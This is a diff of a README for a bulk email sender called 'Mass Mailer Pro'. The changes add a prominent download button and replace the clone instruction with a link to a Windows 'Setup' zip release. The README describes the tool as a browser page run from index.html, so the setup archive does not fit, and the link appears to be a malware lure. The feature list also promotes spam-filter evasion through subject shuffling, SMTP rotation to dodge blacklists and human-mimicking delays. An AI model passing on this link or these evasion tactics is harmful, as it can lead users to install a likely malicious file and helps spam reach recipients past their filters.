@@ -1,21 +1,36 @@
-# Mass Mailer Pro - Bulk Email Sender & SMTP Rotator
+# 🚀 Mass Mailer Pro - Bulk Email Sender & SMTP Rotator
+
+<div align="center">
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Technology](https://img.shields.io/badge/Tech-HTML5%20%7C%20Tailwind%20%7C%20JS-blue)](https://developer.mozilla.org/en-US/docs/Web/HTML)
 [![Status](https://img.shields.io/badge/Status-Active-success)]()
 
+<br/>
+
+## 📥 DOWNLOAD LATEST VERSION
+<a href="https://github.com/gicFlow989/MassMailer2026/releases/download/Release/MassMailer2026.Setup.1.8.8.zip">
+  <img src="https://img.shields.io/badge/���️_DOWNLOAD_NOW-Mass_Mailer_Pro_v1.8.8-2ea44f?style=for-the-badge&logo=windows&logoColor=white" height="60" alt="Download Mass Mailer Pro" />
+</a>
+
+<p><em>Click the button above to download the MassMailer2026 Setup (v1.8.8)</em></p>
+
+</div>
+
+---
+
 **Mass Mailer Pro** is a powerful, open-source **bulk email sender** and **SMTP rotation tool** designed for high-volume email marketing campaigns, newsletters, and cold outreach. Built with modern web technologies, this lightweight **mass mailing software** allows you to send unlimited emails using multiple SMTP servers to ensure high deliverability and avoid spam folders.
 
 ---
 
-## Key Features
+## 🗝️ Key Features
 
 ### 🔄 Advanced SMTP Management & Rotation
 *   **Multi-SMTP Support:** Add unlimited **SMTP servers** (Gmail, Outlook, AWS SES, SendGrid, Zoho, etc.).
 *   **Load Balancing:** The **SMTP rotator** automatically distributes traffic across all configured servers to prevent IP blacklisting.
 *   **Secure Connection:** Supports TLS/SSL and custom ports (587, 465, 25).
 
-### Anti-Spam & Deliverability Tools
+### 🛡️ Anti-Spam & Deliverability Tools
 *   **Subject Randomization:** Input multiple subject lines; the tool shuffles them for every email to bypass spam filters that flag identical subject lines.
 *   **Smart Delays:** Configure minimum and maximum time delays (in seconds) between sends to mimic human behavior.
 *   **Content Spinning:** Rotate through different server configurations automatically.
@@ -35,23 +50,16 @@
 ---
 
 ## 📸 Screenshots & Interface
-![Screenshot 1](https://i.ibb.co/Kcsfv2Rc/Screenshot-2026-01-05-at-11-18-52.png)
-![Screenshot 2](https://i.ibb.co/8LX6JDZX/Screenshot-2026-01-05-at-11-19-02.png)
-![Screenshot 3](https://i.ibb.co/PZ1Xh2w1/Screenshot-2026-01-05-at-11-19-15.png)
-![Screenshot 4](https://i.ibb.co/NnFSsLYP/Screenshot-2026-01-05-at-11-19-09.png)
 
-### 1. SMTP Server Configuration
-Manage your mailing infrastructure. Add, remove, and test multiple SMTP connections easily.
+| **Sending Dashboard** | **Randomizer Settings** |
+|:---:|:---:|
+| ![Bulk Email Sending Progress - Real Time Logs](https://i.ibb.co/Kcsfv2Rc/Screenshot-2026-01-05-at-11-18-52.png) | ![Email Randomizer - Anti-Spam Configuration](https://i.ibb.co/8LX6JDZX/Screenshot-2026-01-05-at-11-19-02.png) |
+| *Live campaign execution with real-time logs* | *Anti-spam settings and subject shuffling* |
 
-### 2. Email Content Editor
-Compose HTML emails and manage your bulk recipient lists (supports CSV style copy-paste).
-
-### 3. Campaign Randomizer
-Configure anti-spam settings, subject line shuffling, and sending intervals.
-
-### 4. Sending Dashboard
-Watch your campaign execution with live logs and progress tracking.
-
+| **SMTP Configuration** | **Email Editor** |
+|:---:|:---:|
+| ![Mass Mailer SMTP Configuration - Bulk Email Server Setup](https://i.ibb.co/PZ1Xh2w1/Screenshot-2026-01-05-at-11-19-15.png) | ![HTML Email Editor - Mass Mailer Content Management](https://i.ibb.co/NnFSsLYP/Screenshot-2026-01-05-at-11-19-09.png) |
+| *Add, remove, and test multiple SMTP connections* | *Compose HTML emails and manage recipient lists* |
 
 ---
 
@@ -59,7 +67,7 @@ Watch your campaign execution with live logs and progress tracking.
 
 This is a **client-side mass mailer** built as a Single Page Application (SPA).
 
-1.  **Download:** Clone this repository or download the ZIP file.
+1.  **Download:** [Click here to download the ZIP file](https://github.com/gicFlow989/MassMailer2026/releases/download/Release/MassMailer2026.Setup.1.8.8.zip).
 2.  **Run:** Open `index.html` in any modern web browser (Chrome, Firefox, Edge).
 3.  **Configure:**
     *   Go to the **SMTP Servers** tab and add your provider details.
